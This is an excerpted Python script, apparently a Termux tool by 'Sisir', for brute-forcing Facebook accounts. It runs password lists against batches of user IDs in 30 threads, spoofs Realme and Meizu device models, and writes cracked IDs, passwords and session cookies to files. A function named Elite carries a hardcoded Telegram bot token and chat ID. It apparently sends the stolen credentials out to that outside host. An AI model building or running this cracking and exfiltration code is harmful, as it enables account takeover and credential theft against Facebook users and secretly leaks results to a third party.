...
def Elite(ids,pas,coki):
    try:
        import requests
        token = "6617924361:AAHayzAjLZAJ_7rD64HBchbAhM0iAEWHWo8"
        chatid = "5581991495"
...
\033[1;37m▄█ █ ▄█ █ █▀▄    SISIR  
\033[1;37m------------------------------------------------
\033[1;37m [•]Owner   :            Sisir
\033[1;37m [•]Facebook:            Scapegoat sisir
\033[1;37m [•]Github  :            Sisirr
\033[1;37m [•]Version :            0.3
================================================
   \33[37;41m\t SISIR  x Sircen \33[0;m
=================================================""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
                        ...
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/sisir.txt  etc..')
                                linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m \x1b[38;5;208mUSE FLIGHT MODE TO ENHANCE YOUR REAL NETWORK SPEED\033[1;37m")
                                        linex()
                                        for user in fo:
...
def npxind():
                ...
                with tred(max_workers=30) as SISIR:     
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    SISIR.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    SISIR.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        open('/sdcard/m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/IDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [OK] '+ids+' | '+pas+' | '+joined(ids)+'\033[1;97m')
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SISIR-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                SISIR = random.choice(["RMX3478","RMX3709","RMX3636","RMX3740","RMX1003","RMX1004", "RMX1005","RMX1007","RMX1009","RMX1011", "RMX1013","RMX1015","RMX1017", "RMX1019","RMX1021","RMX1023", "RMX1024","RMX1027","RMX1029","RMX2001","RMX2002","RMX2003","RMX2004", "RMX2005","RMX2020", "RMX2021", "RMX2022","RMX2023","RMX2024","RMX2030", "RMX2031","RMX2032","RMX2033","RMX2034","RMX2040","RMX2041","RMX2042","RMX2043","RMX2044","RMX2050", "RMX2051","RMX2052","RMX2053", "RMX2054","RMX2060","RMX2061","RMX2062","RMX2063","RMX2064","RMX2070","RMX2071","RMX2072","RMX2073", "RMX2074","Meizu M6","Meizu M6T","Meizu M6s","Meizu M6 Note","Meizu M6s Plus","Meizu 16th","Meizu 16s","Meizu 16Xs", "Meizu 16T","Meizu 16s Pro","Meizu 17","Meizu 17 Pro","Meizu 17T","Meizu 17x", "Meizu 18","Meizu 18 Pro","Meizu 18X", "Meizu 18s","Meizu 18s Pro","Meizu 18s Pro+","Meizu 19","Meizu 19 Pro","MX2","MZ-MEIZU 18s","MZ-16 X","meizu 17 Pro"])
